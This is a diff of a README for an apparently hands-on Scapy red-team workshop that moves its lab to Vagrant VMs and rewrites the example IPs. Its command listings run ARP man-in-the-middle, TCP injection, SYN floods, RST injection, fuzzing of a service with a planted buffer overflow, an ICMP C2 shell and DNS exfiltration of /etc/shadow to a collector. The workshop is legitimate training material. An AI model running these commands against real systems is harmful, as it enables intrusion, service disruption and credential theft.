@@ -1,15 +1,16 @@
-# Workshop Complete — 38 Files, 33 Python Scripts
+# Workshop Complete — 33 Python Scripts, Vagrant-Provisioned Lab
 
 ## Structure
 
 ```
 dc34_workshop/
 ├── README.md                    ← Workshop overview, agenda, quick start
-├── requirements.txt             ← scapy, streamlit, plotly, networkx, pandas
+├── Vagrantfile                  ← Builds + provisions both lab VMs (vagrant up)
+├── requirements.txt             ← streamlit, plotly, networkx, pandas (Scapy installed from source)
 ├── setup/
-│   ├── README.md                ← VM setup, network diagram, troubleshooting
+│   ├── README.md                ← Vagrant lab setup, network diagram, troubleshooting
 │   └── verify_env.py            ← Automated pre-flight check (run first)
-├── module1/ Fundamentals        ← Packet construction, send/recv, sniff, PCAP I/O
+├── module1/ Fundamentals        ← Packet construction, send/recv, sniff, PCAP I/O (+ README)
 ├── module2/ Recon & Scanning    ← SYN scanner, host discovery, OS fingerprinter
 ├── module3/ ARP & ICMP          ← Full ARP MitM w/ cache restore, ICMP redirect
 ├── module4/ TCP/IP Stack Abuse  ← Session injector, SYN flood, RST killer, IP options
@@ -48,43 +49,43 @@ dc34_workshop/
 ## Toolkit Quick Start
 
 ```bash
-# 0. Verify your lab environment (run this first)
-sudo python3 setup/verify_env.py
+# Run these inside the attacker VM (vagrant ssh attacker). Scapy and all
+# dependencies are already installed by the Vagrant provisioner; the repo is at /vagrant.
 
-# 1. Install dependencies
-pip3 install -r requirements.txt
+# 0. Verify your lab environment (run this first)
+sudo python3 /vagrant/setup/verify_env.py
 
 # 2. Recon — discover live hosts and scan ports
-sudo python3 redteam_toolkit/cli.py recon --target 10.0.0.0/24
-sudo python3 redteam_toolkit/cli.py scan  --target 10.0.0.2 --ports 1-1024
+sudo python3 redteam_toolkit/cli.py recon --target 192.168.56.0/24
+sudo python3 redteam_toolkit/cli.py scan  --target 192.168.56.2 --ports 1-1024
 
 # 3. ARP MitM — intercept traffic between victim and gateway
-sudo python3 redteam_toolkit/cli.py mitm --victim 10.0.0.2 --gateway 10.0.0.254
+sudo python3 redteam_toolkit/cli.py mitm --victim 192.168.56.2 --gateway 192.168.56.254
 
 # 4. Fuzz — find crashes in the custom protocol service
-sudo python3 redteam_toolkit/cli.py fuzz --target 10.0.0.2 --port 9000
+sudo python3 redteam_toolkit/cli.py fuzz --target 192.168.56.2 --port 9000
 
 # 5. ICMP C2 — interactive shell over ICMP (agent must run on target)
-sudo python3 redteam_toolkit/cli.py c2 --target 10.0.0.2
+sudo python3 redteam_toolkit/cli.py c2 --target 192.168.56.2
 
 # 6. DNS Exfiltration — exfiltrate a file over DNS queries
-sudo python3 redteam_toolkit/cli.py exfil --file /etc/shadow --collector 10.0.0.1
+sudo python3 redteam_toolkit/cli.py exfil --file /etc/shadow --collector 192.168.56.1
 
 # 7. SYN Flood — exhaust TCP backlog on target port
-sudo python3 redteam_toolkit/cli.py flood --target 10.0.0.2 --port 80 --duration 30
+sudo python3 redteam_toolkit/cli.py flood --target 192.168.56.2 --port 80 --duration 30
 
 # 8. RST Injection — kill active TCP sessions
-sudo python3 redteam_toolkit/cli.py rst --target 10.0.0.2 --port 23
+sudo python3 redteam_toolkit/cli.py rst --target 192.168.56.2 --port 23
 ```
 
 ---
 
 ## Streamlit Dashboards
 
-### Install dependencies (first time only)
-```bash
-pip3 install -r requirements.txt
-```
+### Dependencies
+Already installed in the attacker VM by the Vagrant provisioner (streamlit, plotly, pandas, etc.).
+The dashboards run inside the VM; open them from your **host** browser at `http://localhost:8501`
+(port 8501 is forwarded). For a manual, non-Vagrant setup see `setup/README.md`.
 
 ### Recon Dashboard — live visual scan UI (Module 2)
 
@@ -110,7 +111,7 @@ All attendees see the live leaderboard, bar chart, and per-team radar charts.
 # No root needed
 streamlit run dashboard/capstone_scoreboard.py
 
-# To share with all lab VMs (everyone sees it at http://10.0.0.1:8501)
+# To share with all lab VMs (everyone sees it at http://192.168.56.1:8501)
 streamlit run dashboard/capstone_scoreboard.py --server.address 0.0.0.0
 ```
 
@@ -143,17 +144,17 @@ Key concepts: `/` stacking operator, `.show2()`, `sr1()`, `sniff()`, `AsyncSniff
 
 ```bash
 # Host discovery (ARP sweep — most reliable on local /24)
-sudo python3 module2/host_discovery.py 10.0.0.0/24
+sudo python3 module2/host_discovery.py 192.168.56.0/24
 
 # Use all methods (ARP + ICMP + TCP + UDP)
-sudo python3 module2/host_discovery.py 10.0.0.0/24 --method all
+sudo python3 module2/host_discovery.py 192.168.56.0/24 --method all
 
 # SYN port scan
-sudo python3 module2/syn_scanner.py 10.0.0.2 --ports 1-1024
-sudo python3 module2/syn_scanner.py 10.0.0.2 --ports 22,80,443,8080,9000
+sudo python3 module2/syn_scanner.py 192.168.56.2 --ports 1-1024
+sudo python3 module2/syn_scanner.py 192.168.56.2 --ports 22,80,443,8080,9000
 
 # OS fingerprinting
-sudo python3 module2/os_fingerprint.py 10.0.0.2 --port 80
+sudo python3 module2/os_fingerprint.py 192.168.56.2 --port 80
 ```
 
 Evasion tips: use `--timeout 0.5` for slower scans, add TTL jitter, use IP fragmentation
@@ -169,12 +170,12 @@ sudo python3 module3/arp_scanner.py --iface eth0 --timeout 60
 
 # ARP MitM (requires IP forwarding)
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
-sudo python3 module3/arp_mitm.py --victim 10.0.0.2 --gateway 10.0.0.254 --iface eth0
+sudo python3 module3/arp_mitm.py --victim 192.168.56.2 --gateway 192.168.56.254 --iface eth0
 
 # ICMP Redirect injection
 sudo python3 module3/icmp_redirect.py \
-    --victim 10.0.0.2 --gateway 10.0.0.254 \
-    --redirect-host 8.8.8.8 --attacker 10.0.0.1
+    --victim 192.168.56.2 --gateway 192.168.56.254 \
+    --redirect-host 8.8.8.8 --attacker 192.168.56.1
 ```
 
 Cleanup: `arp_mitm.py` automatically restores ARP caches on Ctrl-C.
@@ -187,18 +188,18 @@ Always verify IP forwarding is enabled before starting MitM or victim loses conn
 ```bash
 # TCP session injector (requires ARP MitM positioning)
 sudo python3 module4/tcp_injector.py \
-    --victim 10.0.0.2 --gateway 10.0.0.254 \
+    --victim 192.168.56.2 --gateway 192.168.56.254 \
     --port 23 --payload "echo HACKED >> /tmp/pwned\n"
 
 # SYN flood (monitor target with: watch -n1 'ss -s')
-sudo python3 module4/syn_flood.py --target 10.0.0.2 --port 80 --duration 30
+sudo python3 module4/syn_flood.py --target 192.168.56.2 --port 80 --duration 30
 
 # RST injection — kill sessions passively
-sudo python3 module4/rst_injector.py --target 10.0.0.2 --port 23 --continuous
+sudo python3 module4/rst_injector.py --target 192.168.56.2 --port 23 --continuous
 
 # IP options demo (LSRR, Record Route, fragmentation)
-sudo python3 module4/ip_options.py --demo all --target 10.0.0.2
-sudo python3 module4/ip_options.py --demo frag --target 10.0.0.2
+sudo python3 module4/ip_options.py --demo all --target 192.168.56.2
+sudo python3 module4/ip_options.py --demo frag --target 192.168.56.2
 ```
 
 ---
@@ -210,13 +211,13 @@ sudo python3 module4/ip_options.py --demo frag --target 10.0.0.2
 python3 module5/target_server.py --port 9000
 
 # DNS fuzzer (target must run dnsmasq or bind9)
-sudo python3 module5/dns_fuzzer.py --target 10.0.0.2 --iters 500
+sudo python3 module5/dns_fuzzer.py --target 192.168.56.2 --iters 500
 
 # Custom protocol fuzzer — finds the buffer overflow in target_server.py
-sudo python3 module5/custom_fuzzer.py --target 10.0.0.2 --port 9000 --iters 1000
+sudo python3 module5/custom_fuzzer.py --target 192.168.56.2 --port 9000 --iters 1000
 
 # Stateful fuzzer skeleton (exercise 5-X)
-sudo python3 module5/custom_fuzzer.py --target 10.0.0.2 --stateful
+sudo python3 module5/custom_fuzzer.py --target 192.168.56.2 --stateful
 
 # Inspect the protocol definition
 python3 module5/custom_proto.py
@@ -235,26 +236,26 @@ The main one: opcode `0xFF` with payload > 64 bytes triggers a buffer overflow c
 sudo python3 module6/icmp_agent.py --iface eth0
 
 # Step 2: Connect from ATTACKER
-sudo python3 module6/icmp_tunnel.py --target 10.0.0.2
+sudo python3 module6/icmp_tunnel.py --target 192.168.56.2
 # > whoami
 # > id
 # > cat /etc/passwd
 
 # Single command (non-interactive)
-sudo python3 module6/icmp_tunnel.py --target 10.0.0.2 --cmd "uname -a"
+sudo python3 module6/icmp_tunnel.py --target 192.168.56.2 --cmd "uname -a"
 
 # ── DNS Exfiltration ──────────────────────────────────────────────────────────
 # Step 1: Start collector on ATTACKER
 sudo python3 module6/dns_collector.py --iface eth0 --output /tmp/received.txt
 
 # Step 2: Send file from TARGET (or attacker for demo)
-sudo python3 module6/dns_exfil.py --file /etc/passwd --collector 10.0.0.1
+sudo python3 module6/dns_exfil.py --file /etc/passwd --collector 192.168.56.1
 
 # ── TCP Header Covert Channels (demo) ────────────────────────────────────────
-sudo python3 module6/tcp_covert.py --demo ipid   --send "HELLO DC34" --target 10.0.0.2
-sudo python3 module6/tcp_covert.py --demo tos    --send "HELLO DC34" --target 10.0.0.2
-sudo python3 module6/tcp_covert.py --demo urgent --send "HELLO DC34" --target 10.0.0.2
-sudo python3 module6/tcp_covert.py --demo timing --send "HI"         --target 10.0.0.2
+sudo python3 module6/tcp_covert.py --demo ipid   --send "HELLO DC34" --target 192.168.56.2
+sudo python3 module6/tcp_covert.py --demo tos    --send "HELLO DC34" --target 192.168.56.2
+sudo python3 module6/tcp_covert.py --demo urgent --send "HELLO DC34" --target 192.168.56.2
+sudo python3 module6/tcp_covert.py --demo timing --send "HI"         --target 192.168.56.2
 
 # Receive IP ID channel
 sudo python3 module6/tcp_covert.py --recv ipid --iface eth0
@@ -287,25 +288,25 @@ sudo python3 module6/icmp_agent.py --iface eth0 &
 
 ```bash
 # 1. Stealth host discovery
-sudo python3 module2/host_discovery.py 10.0.0.0/24 --method arp
+sudo python3 module2/host_discovery.py 192.168.56.0/24 --method arp
 
 # 2. Identify service on port 9000
-sudo python3 module2/syn_scanner.py 10.0.0.2 --ports 9000
+sudo python3 module2/syn_scanner.py 192.168.56.2 --ports 9000
 python3 module5/custom_proto.py   # examine the protocol
 
 # 3. Fuzz and crash the service
-sudo python3 module5/custom_fuzzer.py --target 10.0.0.2 --port 9000
+sudo python3 module5/custom_fuzzer.py --target 192.168.56.2 --port 9000
 
 # 4. ICMP C2 shell
-sudo python3 module6/icmp_tunnel.py --target 10.0.0.2
+sudo python3 module6/icmp_tunnel.py --target 192.168.56.2
 
 # 5. DNS exfiltration
 sudo python3 module6/dns_collector.py --iface eth0 --output /tmp/shadow &
-sudo python3 module6/dns_exfil.py --file /etc/shadow --collector 10.0.0.1
+sudo python3 module6/dns_exfil.py --file /etc/shadow --collector 192.168.56.1
 
 # 6. Cleanup
-sudo arp -d 10.0.0.254
-sudo arp -d 10.0.0.2
+sudo arp -d 192.168.56.254
+sudo arp -d 192.168.56.2
 # (via C2): pkill -f icmp_agent; rm -f /tmp/pwned
 ```
 
@@ -320,10 +321,10 @@ from redteam_toolkit.fuzzer import fuzz_service
 from redteam_toolkit.covert import IcmpC2, DnsExfil
 
 # Host discovery
-live = sweep("10.0.0.0/24", method="arp")
+live = sweep("192.168.56.0/24", method="arp")
 
 # Port scan
-ports = syn_scan("10.0.0.2", "1-1024")
+ports = syn_scan("192.168.56.2", "1-1024")
 open_ports = [p for p, s in ports.items() if s == "open"]
 
 # ARP MitM as context manager (auto-restores on exit)
@@ -331,19 +332,19 @@ def my_intercept(pkt):
     if pkt.haslayer("Raw"):
         print(pkt["Raw"].load[:80])
 
-with ArpMitm("10.0.0.2", "10.0.0.254", callback=my_intercept):
+with ArpMitm("192.168.56.2", "192.168.56.254", callback=my_intercept):
     import time; time.sleep(30)
 
 # Fuzz the service
-crashes = fuzz_service("10.0.0.2", port=9000, iters=500)
+crashes = fuzz_service("192.168.56.2", port=9000, iters=500)
 
 # ICMP C2
-c2 = IcmpC2("10.0.0.2")
+c2 = IcmpC2("192.168.56.2")
 output = c2.run("whoami")
 print(output)
 
 # DNS exfil
-exfil = DnsExfil(collector_ip="10.0.0.1", delay=0.3)
+exfil = DnsExfil(collector_ip="192.168.56.1", delay=0.3)
 exfil.send("/etc/passwd")
 ```
 
